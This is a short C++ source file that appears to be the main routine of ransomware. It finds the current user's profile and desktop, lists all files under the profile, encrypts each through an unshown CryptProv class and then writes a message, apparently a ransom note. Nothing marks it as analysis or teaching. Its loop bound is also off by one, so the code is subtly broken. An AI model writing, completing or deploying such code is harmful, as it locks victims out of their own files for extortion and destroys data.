#include <iostream>
#include <vector>
#include "FileSys.h"
#include "CryptProv.h"

int main()
{
    FileSys                  CL_FSYS;
    CryptProv                CL_CRYPTPROV;
    std::vector<std::string> VEC_TARGETS;

    CL_FSYS.FUNC_GET_USERPROFILE();
    CL_FSYS.FUNC_GET_DESKTOP_FOR_USER();

    if (CL_FSYS.STR_USERPROFILE != "")
    {
        if (!CL_FSYS.FUNC_FILE_EXISTS(CL_FSYS.STR_MESSAGE_PATH))
        {
            VEC_TARGETS = CL_FSYS.FUNC_GET_FILE_LISTING(CL_FSYS.STR_USERPROFILE);
            for (int INT_POS = 0; INT_POS <= VEC_TARGETS.size(); ++INT_POS)
            {
                CL_CRYPTPROV.FUNC_ENCRYPT_FILE(VEC_TARGETS.at(INT_POS));
            }


            CL_FSYS.FUNC_CREATE_MESSAGE();
        }
    }
}
